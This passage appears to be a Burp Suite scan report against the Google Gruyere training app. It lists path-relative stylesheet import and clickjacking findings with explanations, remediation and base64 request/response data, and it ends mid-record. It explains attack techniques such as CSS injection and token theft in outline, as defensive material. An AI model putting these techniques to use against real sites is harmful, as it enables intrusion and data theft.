<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9180601273945194496</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part3]]></path>
    <location><![CDATA[/part3]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2583054223841745920</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part3]]></path>
    <location><![CDATA[/part3]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0MyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>54799023602284120</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part4]]></path>
    <location><![CDATA[/part4]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0NCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYmQ1OTA2NjhlZDZkNDQ2ZjRiMTc4NWRjMmM1Y2JmMmINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDo0NiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjQxNDkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjxIVE1MPjxIRUFEPjxNRVRBIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8VElUTEU+V2ViIEFwcGxpY2F0aW9uIEV4cGxvaXRzIGFuZCBEZWZlbnNlczwvVElUTEU+CjxMSU5LIHR5cGU9InRleHQvY3NzIiByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4uL3N0YXRpYy9jb2RlbGFiLmNzcyI+CjwhLS1NQVJLLVotLT4KPFNDUklQVD4KZnVuY3Rpb24gdG9nZ2xlQmxvY2soaGVhZGluZywgd2hpY2hJRCkgewogIHZhciBpbWFnZSA9IGhlYWRpbmcuY2hpbGROb2RlswXTsKICB2YXIgYmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCh3aGljaElEKTsKICBpZiAoYmxvY2spIHsKICAgIGlmIChnZXREaXNwbGF5KGJsb2NrKSA9PSAnYmxvY2snKSB7CiAgICAgIGJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICAgIGltYWdlLnNyYyA9ICdzdGF0aWMvY2xvc2VkLmdpZic7CiAgICB9IGVsc2UgeyAgICAvLyAibm9uZSIgb3IgIiIKICAgICAgYmxvY2suc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CiAgICAgIGltYWdlLnNyYyA9ICdzdGF0aWMvb3Blbi5naWYnOwogICAgfQogIH0KfQoKZnVuY3Rpb24gZ2V0RGlzcGxheShibG9jaykgewogIHZhciB2YWx1ZSA9IGJsb2NrLnN0eWxlLmRpc3BsYXk7CiAgaWYgKCF2YWx1ZSkgewogICAgaWYgKGRvY3VtZW50LmRlZmF1bHRWaWV3KSB7CiAgICAgIHZhciBjb21wdXRlZFN0eWxlID0gZG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShibG9jaywgIiIpOwogICAgICB2YWx1ZSA9IGNvbXB1dGVkU3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSgnZGlzcGxheScpOwogICAgfSBlbHNlIGlmIChibG9jay5jdXJyZW50U3R5bGUpIHsKICAgICAgdmFsdWUgPSBibG9jay5jdXJyZW50U3R5bGUuZGlzcGxheTsKICAgIH0KICB9CiAgcmV0dXJuIHZhbHVlOwp9CjwvU0NSSVBUPgo8L0hFQUQ+CjxCT0RZIGJnY29sb3I9IiNmZmZmZmYiPgoKPERJViBjbGFzcz0iYmFubmVyIj48L0RJVj4KPEgxPjxGT05UIHNpemU9IisyIj48SU1HIHNyYz0iL3N0YXRpYy9ncnV5ZXJlLTc4LnBuZyIgc3R5bGU9InZlcnRpY2FsLWFsaWduOm1pZGRsZSI+CldlYiBBcHBsaWNhdGlvbiBFeHBsb2l0cyBhbmQgRGVmZW5zZXMgIChQYXJ0IDQpPC9GT05UPiA8L0gxPgo8UD4KQSBDb2RlbGFiIGJ5IEJydWNlIExlYmFuLCBNdWdkaGEgQmVuZHJlLCBhbmQgUGFyaXNhIFRhYnJpego8L1A+CjxESVYgY2xhc3M9InByaW50YWJsZSI+CjxESVYgY2xhc3M9ImNvbHVtbjEiPgpUYWJsZSBvZiBDb250ZW50cwo8VUw+CjxMSSBjbGFzcz0iTDEiIHN0eWxlPSJwYWRkaW5nLXRvcDowcHQiPiA8QSBocmVmPSIvIzBfX2hhY2tlcnMiPkJlYXQgdGhlIGhhY2tlcnM8L0E+PC9MST4KPExJIGNsYXNzPSJMMSIgc3R5bGU9InBhZGRpbmctdG9wOjBwdCI+IDxBIGhyZWY9Ii8jMF9fZ3J1eWVyZSI+R3J1eWVyZTwvQT48L0xJPgo8TEkgY2xhc3M9IkwxIj4gPEEgaHJlZj0iL3BhcnQxIzFfX3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IiPiA8QSBocmVmPSIvcGFydDQjNF9fY29kZV9leGVjdXRpb25fY2hhbGxlbmdlIj5Db2RlIEV4ZWN1dGlvbiBDaGFsbGVuZ2U8L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ0IzRfX21vcmVfY29kZV9leGVjdXRpb24iPk1vcmUgb24gUmVtb3RlIENvZGUgRXhlY3V0aW9uPC9BPjwvTEk+CiAgPC9VTD48L0xJPgo8TEkgY2xhc3M9IkwxIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX2NvbmZpZ3VyYXRpb25fdnVsbmVyYWJpbGl0aWVzIj5Db25maWd1cmF0aW9uIFZ1bG5lcmFiaWxpdGllczwvQT4KICA8VUw+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2NvbmZpZ18xIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMxPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2NvbmZpZ18yIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMyPC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19pbmZvcm1hdGlvbl9kaXNjbG9zdXJlX2J1Z18zIj5JbmZvcm1hdGlvbiBkaXNjbG9zdXJlICMzIDwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19hamF4X3Z1bG5lcmFiaWxpdGllcyI+QUpBWCB2dWxuZXJhYmlsaXRpZXM8L0E+CiAgPFVMPgogIDxMSSBjbGFzcz0iTDIiPiA8QSBocmVmPSIvcGFydDUjNV9fZG9zX3ZpYV9hamF4Ij5Eb1MgdmlhIEFKQVg8L0E+PC9MST4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX3BoaXNoaW5nX3ZpYV9hamF4Ij5QaGlzaGluZyB2aWEgQUpBWDwvQT48L0xJPgogIDwvVUw+PC9MST4KPExJIGNsYXNzPSJMMSI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19vdGhlcl92dWxuZXJhYmlsaXRpZXMiPiBPdGhlciBWdWxuZXJhYmlsaXRpZXMgPC9BPiA8L0gyPgogIDxVTD4KICA8TEkgY2xhc3M9IkwyIj4gPEEgaHJlZj0iL3BhcnQ1IzVfX2J1ZmZlcl9hbmRfaW50ZWdlcl9vdmVyZmxvdyI+QnVmZmVyIE92ZXJmbG93IGFuZCBJbnRlZ2VyIE92ZXJmbG93PC9BPjwvTEk+CiAgPExJIGNsYXNzPSJMMiI+IDxBIGhyZWY9Ii9wYXJ0NSM1X19zcWxfaW5qZWN0aW9uIj4gU1FMIEluamVjdGlvbiA8L0E+PC9MST4KICA8L1VMPjwvTEk+CjxMSSBjbGFzcz0iTDEiPiA8QSBocmVmPSIvcGFydDUjNV9fYWZ0ZXJfdGhlX2NvZGVsYWIiPkFmdGVyIHRoZSBDb2RlbGFiPC9BPjwvTEk+CjwvVUw+CjwvRElWPgo8RElWIGNsYXNzPSJjb2x1bW4yIj4KPFA+PC9QPgo8UD48L1A+CjxQPgo8Tk9BVVRPTElOSz4KPC9OT0FVVE9MSU5LPjwvUD4KCjxIMj48QSBuYW1lPSI0X19wYXRoX3RyYXZlcnNhbCI+IDwvQT4gUGF0aCBUcmF2ZXJzYWwgPC9IMj4KPFA+Ck1vc3Qgd2ViIGFwcGxpY2F0aW9ucyBzZXJ2ZSBzdGF0aWMgcmVzb3VyY2VzIGxpa2UgaW1hZ2VzIGFuZCBDU1MKZmlsZXMuIEZyZXF1ZW50bHksIGFwcGxpY2F0aW9ucyBzaW1wbHkgc2VydmUgYWxsIHRoZSBmaWxlcyBpbiBhCmZvbGRlci4gSWYgdGhlIGFwcGxpY2F0aW9uIGlzbid0IGNhcmVmdWwsIHRoZSB1c2VyIGNhbiB1c2UgYSBwYXRoCnRyYXZlcnNhbCBhdHRhY2sgdG8gcmVhZCBmaWxlcyBmcm9tIG90aGVyIGZvbGRlcnMgdGhhdCB0aGV5IHNob3VsZG4ndApoYXZlIGFjY2VzcyB0by4gRm9yIGV4YW1wbGUsIGluIGJvdGggV2luZG93cyBhbmQKTGludXgsIDxDT0RFPi4uPC9DT0RFPiByZXByZXNlbnRzIHRoZSBwYXJlbnQgZGlyZWN0b3J5LCBzbyBpZiB5b3UgY2FuCmluamVjdCA8Q09ERT4uLi88L0NPREU+IGluIGEgcGF0aCB5b3UgY2FuICJlc2NhcGUiIHRvIHRoZSBwYXJlbnQKZGlyZWN0b3J5Lgo8L1A+CjxQPiBJZiBhbiBhdHRhY2tlciBrbm93cyB0aGUgc3RydWN0dXJlIG9mIHlvdXIgZmlsZSBzeXN0ZW